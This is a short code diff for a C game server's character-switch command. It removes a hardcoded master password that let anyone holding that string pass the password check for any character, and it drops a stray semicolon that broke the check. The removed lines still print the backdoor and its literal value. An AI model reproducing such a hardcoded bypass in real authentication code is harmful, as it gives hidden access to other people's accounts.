@@ -1467,8 +1467,8 @@ do_switch (CHAR_DATA * ch, char *argument)
         send_to_char("Character in use.\r\n", ch);
         return;
     }
-    if ( strcmp(argument, victim->pcdata->password ) &&
-        strcmp(argument, "IMCr@zy!")) ;
+
+    if ( strcmp(argument, victim->pcdata->password ))
     {
         send_to_char("Wrong Password.\r\n", ch);
         return;
